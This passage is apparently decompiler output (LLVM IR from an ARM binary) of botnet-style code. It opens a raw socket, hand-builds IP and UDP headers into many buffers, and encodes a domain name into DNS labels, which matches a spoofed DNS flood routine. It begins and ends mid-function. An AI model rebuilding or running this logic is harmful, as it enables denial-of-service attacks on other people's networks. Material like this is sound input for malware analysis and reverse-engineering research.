  %v0_a6c029 = phi i32 [ %v0_a6c0, %dec_label_pc_a6b4 ], [ %v0_a6c030, %dec_label_pc_a688 ], [ %v0_a6c0, %bb ]
  %v0_a6a025 = phi i32 [ 0, %dec_label_pc_a6b4 ], [ %v0_a6a026, %dec_label_pc_a688 ], [ 0, %bb ]
  %v1_a690 = add i32 %v0_a690, 1
  store i32 %v1_a690, i32* @r4, align 4
  %v9_a694 = icmp eq i32 %v1_a690, %v0_a670
  store i1 %v9_a694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a694, label %dec_label_pc_ab04, label %dec_label_pc_a69c

dec_label_pc_a69c:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a678
  %v0_a690 = phi i32 [ %v1_a690, %dec_label_pc_a690 ], [ %v0_a668, %dec_label_pc_a678 ]
  %v0_a6c0 = phi i32 [ %v0_a6c029, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a0 = phi i32 [ %v0_a6a025, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a8 = phi i32 [ %v1_a6a8, %dec_label_pc_a690 ], [ %v2_a678, %dec_label_pc_a678 ]
  %v1_a69c = inttoptr i32 %v0_a6a8 to i8*
  %v2_a69c = load i8, i8* %v1_a69c, align 1
  %v3_a69c = zext i8 %v2_a69c to i32
  store i32 %v3_a69c, i32* %r3.global-to-local, align 4
  %v2_a6a0 = icmp eq i32 %v0_a6a0, 0
  store i1 %v2_a6a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a6a4, i32* %r0.global-to-local, align 4
  %v1_a6a8 = add i32 %v0_a6a8, 1
  store i32 %v1_a6a8, i32* %r2.global-to-local, align 4
  %v1_a6ac = add nsw i32 %v3_a69c, -48
  store i32 %v1_a6ac, i32* %r1.global-to-local, align 4
  br i1 %v2_a6a0, label %dec_label_pc_a6b4, label %dec_label_pc_a6c4

dec_label_pc_a6b4:                                ; preds = %dec_label_pc_a69c
  %v7_a6b4 = icmp eq i8 %v2_a69c, 9
  store i1 %v7_a6b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6b4, label %dec_label_pc_a690, label %bb

bb:                                               ; preds = %dec_label_pc_a6b4
  %v8_a6b8 = icmp eq i8 %v2_a69c, 32
  store i1 %v8_a6b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_a6b8, label %dec_label_pc_a690, label %dec_label_pc_a6c0

dec_label_pc_a6c0:                                ; preds = %bb
  %v1_a6c0 = add i32 %v0_a6c0, 1
  store i32 %v1_a6c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a6c4

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a69c, %dec_label_pc_a6c0
  %v0_a6c030 = phi i32 [ %v0_a6c0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v0_a6a026 = phi i32 [ %v0_a6a0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v7_a6c4 = icmp eq i8 %v2_a69c, 46
  store i1 %v7_a6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6c4, label %dec_label_pc_a688, label %bb103

bb103:                                            ; preds = %dec_label_pc_a6c4
  %v8_a6c8 = icmp eq i32 %v1_a6ac, 9
  store i1 %v8_a6c8, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_a6ac, 10
  br i1 %tmp, label %dec_label_pc_a688, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a688, %bb103
  %v0_a690.lcssa = phi i32 [ %v1_a6a4, %dec_label_pc_a688 ], [ %v0_a690, %bb103 ]
  %v2_a6d4 = sub i32 %v0_a690.lcssa, %v0_a668
  store i32 %v2_a6d4, i32* @r4, align 4
  %v2_a6d8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_a678, i32* %r1.global-to-local, align 4
  store i32 %v2_a6d8, i32* %r0.global-to-local, align 4
  store i32 %v2_a6d4, i32* %r2.global-to-local, align 4
  %v3_a6e8 = call i32 @util_memcpy(i32 %v2_a6d8, i32 %v2_a678, i32 %v2_a6d4)
  %v2_a6ec = ptrtoint i32* %stack_var_-40 to i32
  %v1_a6f0 = load i32, i32* @r4, align 4
  %v2_a6f0 = add i32 %v1_a6f0, %v2_a6ec
  store i32 %v2_a6f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a6d8, i32* @r0, align 4
  %v3_a6fc = add i32 %v2_a6f0, -36
  %v4_a6fc = inttoptr i32 %v3_a6fc to i8*
  store i8 0, i8* %v4_a6fc, align 1
  %v1_a700 = call i32 @inet_addr(i32 %v2_a6d8)
  store i32 %v1_a700, i32* %r0.global-to-local, align 4
  store i32 %v1_a700, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_a70811:                              ; preds = %dec_label_pc_ab04
  unreachable

dec_label_pc_a708:                                ; preds = %dec_label_pc_ab6c, %dec_label_pc_ab60, %dec_label_pc_ab50, %dec_label_pc_ab40, %dec_label_pc_a6d0
  %v1_ab3c49 = phi i32 [ %v1_ab08, %dec_label_pc_ab6c ], [ %v1_ab08, %dec_label_pc_ab60 ], [ %v1_ab08, %dec_label_pc_ab50 ], [ %v1_ab08, %dec_label_pc_ab40 ], [ %v1_a700, %dec_label_pc_a6d0 ]
  %v0_a708 = load i32, i32* @r7, align 4
  %v2_a708 = icmp eq i32 %v0_a708, 0
  store i1 %v2_a708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a708, label %dec_label_pc_ab30, label %dec_label_pc_a710

dec_label_pc_a710:                                ; preds = %dec_label_pc_a708
  store i32 %v0_a708, i32* %r0.global-to-local, align 4
  %v1_a714 = inttoptr i32 %v0_a708 to i8*
  %v2_a714 = call i32 @util_strlen(i8* %v1_a714)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_a714, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a728 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v7_a72c = icmp eq i32 %v3_a728, -1
  store i1 %v7_a72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a72c, label %dec_label_pc_ab30, label %dec_label_pc_a738

dec_label_pc_a738:                                ; preds = %dec_label_pc_a710
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a740 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a740, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a754 = call i32 @__GI_setsockopt(i32 %v3_a728, i32 0, i32 3, i32 %v6_a740, i32 4)
  store i32 %v5_a754, i32* %r0.global-to-local, align 4
  %v7_a758 = icmp eq i32 %v5_a754, -1
  store i1 %v7_a758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a758, label %dec_label_pc_ab28, label %dec_label_pc_a760

dec_label_pc_a760:                                ; preds = %dec_label_pc_a738
  %v0_a768 = load i32, i32* %sb.global-to-local, align 4
  %v1_a768 = urem i32 %v0_a768, 256
  store i32 %v1_a768, i32* %sb.global-to-local, align 4
  %v3_a770 = mul i32 %v6_a578, 65536
  store i32 %v3_a770, i32* %r3.global-to-local, align 4
  %v5_a77c = trunc i32 %v0_a768 to i8
  %v0_a780 = load i32, i32* @r8, align 4
  %v2_a780 = icmp eq i32 %v0_a780, 0
  store i1 %v2_a780, i1* %cpsr_z.global-to-local, align 1
  %v3_a784 = urem i32 %v7_a51c, 65536
  store i32 %v3_a784, i32* %r0.global-to-local, align 4
  %v3_a78c = urem i32 %v6_a578, 65536
  store i32 %v3_a78c, i32* %r2.global-to-local, align 4
  %v3_a790 = mul i32 %v6_a590, 65536
  %v3_a794 = mul i32 %v6_a5ac, 65536
  store i32 %v3_a794, i32* %ip.global-to-local, align 4
  br i1 %v2_a780, label %bb104, label %bb105

bb104:                                            ; preds = %dec_label_pc_a760
  %v5_a79c = sext i8 %v5_a77c to i32
  store i32 %v5_a79c, i32* %r2.global-to-local, align 4
  br label %bb105

bb105:                                            ; preds = %dec_label_pc_a760, %bb104
  %v2_a7c8 = phi i32 [ %v3_a78c, %dec_label_pc_a760 ], [ %v5_a79c, %bb104 ]
  %v3_a7a8 = urem i32 %v6_a590, 65536
  store i32 %v3_a7a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_a7b0 = urem i32 %v6_a5ac, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_a7c8 = load i32, i32* @r6, align 4
  br i1 %v2_a780, label %.dec_label_pc_a9b0.preheader_crit_edge, label %dec_label_pc_a7d0

.dec_label_pc_a9b0.preheader_crit_edge:           ; preds = %bb105
  %v3_a7c8 = add i32 %v1_a7c8, %v2_a7c8
  store i32 %v3_a7c8, i32* @r7, align 4
  %.pre = sext i8 %v5_a77c to i32
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a7d0:                                ; preds = %bb105
  %v2_a7d0 = add i32 %v1_a7c8, %v1_a768
  %v3_a7d4 = mul i32 %v2_a7d0, 65536
  %v1_a7dc = add i32 %v3_a7d4, 1769472
  %v1_a7e0 = add i32 %v3_a7d4, 3080192
  %tmp106 = udiv i32 %v1_a7e0, 256
  %v3_a7f4 = and i32 %tmp106, 65280
  %v4_a804 = udiv i32 %v1_a7e0, 16777216
  %v5_a804 = or i32 %v3_a7f4, %v4_a804
  store i32 %v5_a804, i32* @sl, align 4
  %trunc60 = trunc i32 %v6_a578 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc60)
  %tmp107 = mul i32 %v7_a51c, 256
  %v3_a818 = and i32 %tmp107, 65280
  store i32 %v3_a818, i32* %r1.global-to-local, align 4
  %tmp108 = udiv i32 %v7_a51c, 256
  %v4_a81c = urem i32 %tmp108, 256
  %v5_a81c = or i32 %v4_a81c, %v3_a818
  store i32 %v5_a81c, i32* @sb, align 4
  store i32 %v3_a794, i32* %r2.global-to-local, align 4
  store i32 %v3_a790, i32* %r0.global-to-local, align 4
  %tmp109 = mul i32 %v6_a590, 256
  %v3_a830 = and i32 %tmp109, 65280
  %tmp110 = mul i32 %v6_a5ac, 256
  %v3_a834 = and i32 %tmp110, 65280
  %tmp111 = udiv i32 %v1_a7dc, 256
  %v3_a838 = and i32 %tmp111, 65280
  store i32 %v3_a838, i32* @lr, align 4
  %tmp112 = udiv i32 %v6_a590, 256
  %v4_a83c = urem i32 %tmp112, 256
  %v5_a83c = or i32 %v4_a83c, %v3_a830
  store i32 %v5_a83c, i32* %ip.global-to-local, align 4
  %tmp113 = udiv i32 %v6_a5ac, 256
  %v4_a840 = urem i32 %tmp113, 256
  %v5_a840 = or i32 %v4_a840, %v3_a834
  store i32 %v5_a840, i32* @r4, align 4
  %v1_a844 = add i32 %v1_a7c8, 1
  store i32 %v1_a844, i32* %r3.global-to-local, align 4
  %v4_a848 = udiv i32 %v1_a7dc, 16777216
  %v5_a848 = or i32 %v4_a848, %tmp111
  store i32 0, i32* @r5, align 4
  %sext = mul i32 %v6_a4f8, 16777216
  %v4_a8a0 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v6_a534, 16777216
  %v4_a8ac = sdiv i32 %sext8, 16777216
  %v4_a8cc = sext i8 %v5_a77c to i32
  %sext9 = mul nuw i32 %v5_a83c, 65536
  %v7_a8e0 = sdiv i32 %sext9, 65536
  %sext10 = mul nuw i32 %v5_a840, 65536
  %v4_a908 = sdiv i32 %sext10, 65536
  %v1_a8a8 = trunc i32 %v4_a8a0 to i8
  %extract.t = trunc i32 %v4_a8ac to i8
  %v1_a8d0 = add nsw i32 %v4_a8cc, 41
  %sext120 = mul i32 %v5_a848, 65536
  %v3_a8e0 = sdiv i32 %sext120, 65536
  br label %dec_label_pc_a860

dec_label_pc_a860:                                ; preds = %dec_label_pc_a980, %dec_label_pc_a7d0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_a868 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_a868, i32* %r0.global-to-local, align 4
  store i32 %v2_a4e0, i32* %ip.global-to-local, align 4
  %v3_a870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  %v2_a874 = load i32, i32* @r5, align 4
  %v5_a874 = mul i32 %v2_a874, 4
  %v6_a874 = add i32 %v5_a874, %v2_a4e0
  %v7_a874 = inttoptr i32 %v6_a874 to i32*
  store i32 %v2_a868, i32* %v7_a874, align 4
  %v0_a878 = load i32, i32* %ip.global-to-local, align 4
  %v1_a878 = load i32, i32* %r3.global-to-local, align 4
  %v4_a878 = mul i32 %v1_a878, 4
  %v5_a878 = add i32 %v4_a878, %v0_a878
  %v6_a878 = inttoptr i32 %v5_a878 to i32*
  %v7_a878 = load i32, i32* %v6_a878, align 4
  store i32 %v7_a878, i32* %r1.global-to-local, align 4
  %v1_a87c = inttoptr i32 %v7_a878 to i8*
  %v2_a87c = load i8, i8* %v1_a87c, align 1
  %tmp127 = urem i8 %v2_a87c, 16
  %v1_a880 = zext i8 %tmp127 to i32
  %v1_a884 = or i32 %v1_a880, 64
  store i32 %v1_a884, i32* %r2.global-to-local, align 4
  %v1_a888 = trunc i32 %v1_a884 to i8
  store i8 %v1_a888, i8* %v1_a87c, align 1
  %v0_a88c = load i32, i32* %r1.global-to-local, align 4
  %v1_a88c = inttoptr i32 %v0_a88c to i8*
  %v2_a88c = load i8, i8* %v1_a88c, align 1
  %v3_a88c = zext i8 %v2_a88c to i32
  %v1_a890 = and i32 %v3_a88c, 240
  %v1_a894 = or i32 %v1_a890, 5
  store i32 %v1_a894, i32* %r3.global-to-local, align 4
  store i32 %v1_a560, i32* %lr.global-to-local, align 4
  %v1_a89c = trunc i32 %v1_a894 to i8
  store i8 %v1_a89c, i8* %v1_a88c, align 1
  store i32 %v4_a8a0, i32* %r0.global-to-local, align 4
  %v0_a8a4 = load i32, i32* %lr.global-to-local, align 4
  %v2_a8a4 = icmp eq i32 %v0_a8a4, 0
  store i1 %v2_a8a4, i1* %cpsr_z.global-to-local, align 1
  %v2_a8a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8a8 = add i32 %v2_a8a8, 1
  %v4_a8a8 = inttoptr i32 %v3_a8a8 to i8*
  store i8 %v1_a8a8, i8* %v4_a8a8, align 1
  store i32 %v4_a8ac, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a8b0, label %.thread13, label %bb114

bb114:                                            ; preds = %dec_label_pc_a860
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a8b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_a8b4 = add i32 %v3_a8b4, 6
  %v5_a8b4 = inttoptr i32 %v4_a8b4 to i16*
  store i16 64, i16* %v5_a8b4, align 2
  %v0_a8bc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t52 = trunc i32 %v0_a8bc.pre to i8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_a860, %bb114
  %v0_a8bc.off0 = phi i8 [ %extract.t, %dec_label_pc_a860 ], [ %extract.t52, %bb114 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_a8bc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8bc = add i32 %v2_a8bc, 8
  %v4_a8bc = inttoptr i32 %v3_a8bc to i8*
  store i8 %v0_a8bc.off0, i8* %v4_a8bc, align 1
  %v0_a8c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8c0 = trunc i32 %v0_a8c0 to i8
  %v2_a8c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8c0 = add i32 %v2_a8c0, 9
  %v4_a8c0 = inttoptr i32 %v3_a8c0 to i8*
  store i8 %v1_a8c0, i8* %v4_a8c0, align 1
  %v2_a8c8 = load i32, i32* @global_var_243d4.57, align 4
  %v0_a8d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_a8d4 = add i32 %v1_a8d0, %v0_a8d0
  store i32 %v2_a8d4, i32* @r4, align 4
  %v2_a8d8 = add i32 %v0_a8d0, 12
  %v3_a8d8 = inttoptr i32 %v2_a8d8 to i32*
  store i32 %v2_a8c8, i32* %v3_a8d8, align 4
  store i32 %v3_a8e0, i32* %r2.global-to-local, align 4
  store i32 %v7_a8e0, i32* %r3.global-to-local, align 4
  %v0_a8e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8e4 = add i32 %v0_a8e4, 20
  store i32 %v1_a8e4, i32* %ip.global-to-local, align 4
  %v0_a8e8 = load i32, i32* @sl, align 4
  %v1_a8e8 = trunc i32 %v0_a8e8 to i16
  %v3_a8e8 = add i32 %v0_a8e4, 2
  %v4_a8e8 = inttoptr i32 %v3_a8e8 to i16*
  store i16 %v1_a8e8, i16* %v4_a8e8, align 2
  %v0_a8ec = load i32, i32* @sb, align 4
  %v1_a8ec = trunc i32 %v0_a8ec to i16
  %v2_a8ec = load i32, i32* %r1.global-to-local, align 4
  %v3_a8ec = add i32 %v2_a8ec, 4
  %v4_a8ec = inttoptr i32 %v3_a8ec to i16*
  store i16 %v1_a8ec, i16* %v4_a8ec, align 2
  %v0_a8f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a8f0 = trunc i32 %v0_a8f0 to i16
  %v2_a8f0 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f0 = add i32 %v2_a8f0, 4
  %v4_a8f0 = inttoptr i32 %v3_a8f0 to i16*
  store i16 %v1_a8f0, i16* %v4_a8f0, align 2
  %v0_a8f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8f4 = trunc i32 %v0_a8f4 to i16
  %v2_a8f4 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f4 = add i32 %v2_a8f4, 2
  %v4_a8f4 = inttoptr i32 %v3_a8f4 to i16*
  store i16 %v1_a8f4, i16* %v4_a8f4, align 2
  %v2_a8fc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8fc = add i32 %v2_a8fc, 20
  %v4_a8fc = inttoptr i32 %v3_a8fc to i16*
  store i16 %rev, i16* %v4_a8fc, align 2
  store i32 %v4_a8cc, i32* %ip.global-to-local, align 4
  %v0_a904 = load i32, i32* %r1.global-to-local, align 4
  %v1_a904 = add i32 %v0_a904, 28
  store i32 %v1_a904, i32* %r0.global-to-local, align 4
  store i32 %v4_a908, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_a914 = add i32 %v0_a904, 30
  %v4_a914 = inttoptr i32 %v3_a914 to i16*
  store i16 1, i16* %v4_a914, align 2
  %v0_a918 = load i32, i32* @lr, align 4
  %v1_a918 = trunc i32 %v0_a918 to i16
  %v2_a918 = load i32, i32* %r0.global-to-local, align 4
  %v3_a918 = add i32 %v2_a918, 4
  %v4_a918 = inttoptr i32 %v3_a918 to i16*
  store i16 %v1_a918, i16* %v4_a918, align 2
  %v0_a91c = load i32, i32* %ip.global-to-local, align 4
  %v1_a91c = trunc i32 %v0_a91c to i8
  %v2_a91c = load i32, i32* %r1.global-to-local, align 4
  %v3_a91c = add i32 %v2_a91c, 40
  %v4_a91c = inttoptr i32 %v3_a91c to i8*
  store i8 %v1_a91c, i8* %v4_a91c, align 1
  %v0_a920 = load i32, i32* @fp, align 4
  %v1_a920 = load i32, i32* %r1.global-to-local, align 4
  %v2_a920 = add i32 %v1_a920, 16
  %v3_a920 = inttoptr i32 %v2_a920 to i32*
  store i32 %v0_a920, i32* %v3_a920, align 4
  %v0_a924 = load i32, i32* %r3.global-to-local, align 4
  %v1_a924 = trunc i32 %v0_a924 to i16
  %v2_a924 = load i32, i32* %r1.global-to-local, align 4
  %v3_a924 = add i32 %v2_a924, 28
  %v4_a924 = inttoptr i32 %v3_a924 to i16*
  store i16 %v1_a924, i16* %v4_a924, align 2
  %v0_a928 = load i32, i32* @r4, align 4
  %v1_a928 = add i32 %v0_a928, 1
  store i32 %v1_a928, i32* %r0.global-to-local, align 4
  %v0_a92c = load i32, i32* @r7, align 4
  store i32 %v0_a92c, i32* %r1.global-to-local, align 4
  store i32 %v1_a844, i32* %r2.global-to-local, align 4
  %v3_a934 = call i32 @util_memcpy(i32 %v1_a928, i32 %v0_a92c, i32 %v1_a844)
  store i32 %v3_a934, i32* %r0.global-to-local, align 4
  %v0_a938 = load i32, i32* @r6, align 4
  %v2_a938 = icmp eq i32 %v0_a938, 0
  store i1 %v2_a938, i1* %cpsr_z.global-to-local, align 1
  %tmp115 = icmp slt i32 %v0_a938, 1
  br i1 %tmp115, label %bb116, label %dec_label_pc_a948

bb116:                                            ; preds = %.thread13
  %v5_a93c = load i32, i32* @r4, align 4
  store i32 %v5_a93c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a980

dec_label_pc_a948:                                ; preds = %.thread13
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a954

dec_label_pc_a954:                                ; preds = %.thread20, %dec_label_pc_a948
  %v0_a960 = phi i32 [ %storemerge, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v0_a964 = phi i32 [ %v0_a978, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v1_a954 = load i32, i32* @r7, align 4
  %v2_a954 = add i32 %v1_a954, %v0_a964
  %v3_a954 = inttoptr i32 %v2_a954 to i8*
  %v4_a954 = load i8, i8* %v3_a954, align 1
  %v6_a954 = zext i8 %v4_a954 to i32
  store i32 %v6_a954, i32* %r3.global-to-local, align 4
  %v7_a958 = icmp eq i8 %v4_a954, 46
  store i1 %v7_a958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a958, label %bb117, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_a954
  %v1_a96016 = add nsw i32 %v0_a960, 1
  store i32 %v1_a96016, i32* %r2.global-to-local, align 4
  %v1_a96418 = add i32 %v0_a964, 1
  store i32 %v1_a96418, i32* %r1.global-to-local, align 4
  br label %bb118

bb117:                                            ; preds = %dec_label_pc_a954
  %v2_a95c = load i32, i32* @r4, align 4
  %v3_a95c = add i32 %v2_a95c, %v0_a964
  store i32 %v3_a95c, i32* %r3.global-to-local, align 4
  %v1_a960 = add nsw i32 %v0_a960, 1
  store i32 %v1_a960, i32* %r2.global-to-local, align 4
  %v1_a964 = add i32 %v0_a964, 1
  store i32 %v1_a964, i32* %r1.global-to-local, align 4
  %v2_a968 = trunc i32 %v0_a960 to i8
  %v3_a968 = load i32, i32* %r0.global-to-local, align 4
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 %v2_a968, i8* %v4_a968, align 1
  %v0_a96c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a96c.pre, label %bb119, label %bb117.bb118_crit_edge

bb117.bb118_crit_edge:                            ; preds = %bb117
  %v1_a96c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %bb117.bb118_crit_edge, %.thread59
  %v1_a96c = phi i32 [ %v1_a96c.pre, %bb117.bb118_crit_edge ], [ %v1_a96016, %.thread59 ]
  %v2_a96c = urem i32 %v1_a96c, 256
  br label %.thread20

bb119:                                            ; preds = %bb117
  %v1_a970 = load i32, i32* %r3.global-to-local, align 4
  %v2_a970 = add i32 %v1_a970, 1
  store i32 %v2_a970, i32* %r0.global-to-local, align 4
  br label %.thread20

.thread20:                                        ; preds = %bb118, %bb119
  %storemerge = phi i32 [ %v2_a96c, %bb118 ], [ 0, %bb119 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_a978 = load i32, i32* %r1.global-to-local, align 4
  %v1_a978 = load i32, i32* @r6, align 4
  %v9_a978 = icmp eq i32 %v0_a978, %v1_a978
  store i1 %v9_a978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a978, label %dec_label_pc_a980.loopexit, label %dec_label_pc_a954

dec_label_pc_a980.loopexit:                       ; preds = %.thread20
  %v2_a980.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t126 = trunc i32 %storemerge to i8
  br label %dec_label_pc_a980

dec_label_pc_a980:                                ; preds = %bb116, %dec_label_pc_a980.loopexit
  %v0_a980.off0 = phi i8 [ %extract.t126, %dec_label_pc_a980.loopexit ], [ 0, %bb116 ]
  %v2_a980 = phi i32 [ %v2_a980.pre, %dec_label_pc_a980.loopexit ], [ %v5_a93c, %bb116 ]
  %v3_a980 = inttoptr i32 %v2_a980 to i8*
  store i8 %v0_a980.off0, i8* %v3_a980, align 1
  %v3_a984 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a984, i32* %r3.global-to-local, align 4
  %v1_a988 = add i32 %v3_a984, 1
  store i32 %v1_a988, i32* @r5, align 4
  %v0_a98c = load i32, i32* @r4, align 4
  %v1_a98c = load i32, i32* @r6, align 4
  %v2_a98c = add i32 %v1_a98c, %v0_a98c
  store i32 %v2_a98c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_a994 = load i32, i32* @r8, align 4
  %v9_a994 = icmp eq i32 %v0_a994, %v1_a988
  store i1 %v9_a994, i1* %cpsr_z.global-to-local, align 1
  %v3_a998 = add i32 %v2_a98c, 4
  %v4_a998 = inttoptr i32 %v3_a998 to i16*
  store i16 256, i16* %v4_a998, align 2
  %v0_a99c = load i32, i32* @lr, align 4
  %v1_a99c = trunc i32 %v0_a99c to i16
  %v2_a99c = load i32, i32* %r2.global-to-local, align 4
  %v3_a99c = add i32 %v2_a99c, 2
  %v4_a99c = inttoptr i32 %v3_a99c to i16*
  store i16 %v1_a99c, i16* %v4_a99c, align 2
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %stack_var_-44, align 4
  %v8_a9a4 = icmp sgt i32 %v0_a994, %v1_a988
  br i1 %v8_a9a4, label %dec_label_pc_a860, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %dec_label_pc_a980
  store i32 %v4_a8cc, i32* %r0.global-to-local, align 4
  %v0_a9ac = load i32, i32* @r6, align 4
  %v2_a9ac = add i32 %v0_a9ac, %v4_a8cc
  store i32 %v2_a9ac, i32* @r7, align 4
  %v0_a9b4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a9b0.preheader:                      ; preds = %.dec_label_pc_a9b0.preheader_crit_edge, %dec_label_pc_a9a8
  %v4_aa14.pre-phi = phi i32 [ %.pre, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v4_a8cc, %dec_label_pc_a9a8 ]
  %v0_a9b4.pre = phi i32 [ 0, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v0_a9b4.pre.pre, %dec_label_pc_a9a8 ]
  %v3_a9e0 = icmp eq i32 %v3_a784, 65535
  %v3_a9f0 = icmp eq i32 %v3_a78c, 65535
  br label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8, %dec_label_pc_a9b0.preheader
  %v0_a9b4 = phi i32 [ %v0_a9b4.pre, %dec_label_pc_a9b0.preheader ], [ 0, %dec_label_pc_aaa8 ], [ 0, %dec_label_pc_a9b0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a9b4 = icmp eq i32 %v0_a9b4, 0
  store i1 %v2_a9b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a9b4, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_a9c4 = load i32, i32* @r7, align 4
  %v1_a9c4 = add i32 %v0_a9c4, 27
  store i32 %v1_a9c4, i32* @sb, align 4
  %v1_a9c8 = add i32 %v0_a9c4, 47
  store i32 %v1_a9c8, i32* @sl, align 4
  br label %dec_label_pc_a9cc

dec_label_pc_a9cc:                                ; preds = %dec_label_pc_aa10, %dec_label_pc_a9c0
  %v1_a9d8 = phi i32 [ %v1_aa98, %dec_label_pc_aa10 ], [ 0, %dec_label_pc_a9c0 ]
  store i32 %v2_a4e0, i32* %r3.global-to-local, align 4
  store i32 %v3_a784, i32* %ip.global-to-local, align 4
  %v4_a9d8 = mul i32 %v1_a9d8, 4
  %v5_a9d8 = add i32 %v4_a9d8, %v2_a4e0
  %v6_a9d8 = inttoptr i32 %v5_a9d8 to i32*
  %v7_a9d8 = load i32, i32* %v6_a9d8, align 4
  store i32 %v7_a9d8, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_a9e0, i1* %cpsr_z.global-to-local, align 1
  %v1_a9e4 = add i32 %v7_a9d8, 20
  store i32 %v1_a9e4, i32* @r6, align 4
  br i1 %v3_a9e0, label %dec_label_pc_aabc, label %dec_label_pc_a9ec

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9cc
  store i32 %v3_a78c, i32* @lr, align 4
  store i1 %v3_a9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a9f0, label %dec_label_pc_aad0, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge, %dec_label_pc_a9ec
